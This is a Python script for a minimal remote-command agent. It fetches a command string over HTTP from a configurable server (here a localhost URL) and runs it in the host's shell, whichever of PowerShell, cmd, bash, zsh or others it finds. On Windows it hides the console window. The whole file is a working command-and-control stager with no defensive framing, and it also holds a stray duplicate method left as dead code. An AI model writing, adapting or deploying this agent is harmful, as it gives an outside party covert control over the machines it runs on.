#!/usr/bin/env python3

import os
import sys
import subprocess
import platform
import shutil
import urllib.request
import urllib.error

class HTTPCommandFetcher:
    def __init__(self, url, platform_override=""):
        self.url = url
        self.platform_override = platform_override

    def get_os_type(self):
        return platform.system().lower()

    def find_command_interface(self):
        os_type = self.platform_override or self.get_os_type()

        interpreters = {
            'windows': ['powershell.exe', 'cmd.exe'],
            'linux': ['zsh', 'bash', 'dash', 'sh'],
            'darwin': ['zsh', 'bash', 'sh'],
            'openbsd': ['ksh', 'sh'],
            'freebsd': ['sh', 'csh']
        }

        if os_type not in interpreters:
            raise ValueError(f"Unsupported OS: {os_type}")

        for interp in interpreters[os_type]:
            path = shutil.which(interp)
            if path:
                return path

        raise RuntimeError(f"No suitable command interface found for {os_type}")

    def fetch_command(self):
        """Fetches a single command via HTTP GET request."""
        try:
            print(f"[*] Fetching command from {self.url}...")
            req = urllib.request.Request(self.url)
            with urllib.request.urlopen(req, timeout=10) as response:
                command = response.read().decode('utf-8').strip()
                return command
        except urllib.error.URLError as e:
            print(f"[!] Failed to reach server: {e}")
            return None
        except Exception as e:
            print(f"[!] Error fetching command: {e}")
            return None

    def execute_command(self, command):
        """Executes the fetched command safely without flashing windows."""
        try:
            interface_path = self.find_command_interface()
            print(f"[+] Using command processor: {interface_path}")
    
            interface_name = os.path.basename(interface_path).lower()
            if 'cmd' in interface_name:
                flag = '/c'
            elif 'powershell' in interface_name:
                flag = '-Command'
            else:
                flag = '-c'
    
            print(f"[*] Executing command: {command}")
    
            # Windows-specific: hide the console window
            startupinfo = None
            if platform.system().lower() == "windows":
                startupinfo = subprocess.STARTUPINFO()
                startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
    
            result = subprocess.run(
                [interface_path, flag, command],
                capture_output=True,
                text=True,
                encoding='utf-8',
                errors='replace',
                startupinfo=startupinfo  
            )
    
            print("[+] Execution complete.")
            if result.stdout:
                print(f"--- STDOUT ---\n{result.stdout.strip()}")
            if result.stderr:
                print(f"--- STDERR ---\n{result.stderr.strip()}")
    
        except Exception as e:
            print(f"[!] Failed to execute command: {e}")
    
        def run(self):
            """Main lifecycle: Fetch 1 command, execute it, and exit."""
            command = self.fetch_command()
            if command:
                self.execute_command(command)
            else:
                print("[*] No command received or fetch failed. Exiting.")

    def run(self):
        """Main lifecycle: Fetch 1 command, execute it, and exit."""
        command = self.fetch_command()
        if command:
            self.execute_command(command)
        else:
            print("[*] No command received or fetch failed. Exiting.")

# =====================
# 🔌 Entry Point
# =====================

if __name__ == "__main__":
    # Point this to the server hosting the command text
    TARGET_URL = "http://127.0.0.1:8080/command.txt"
    
    agent = HTTPCommandFetcher(TARGET_URL)
    agent.run()
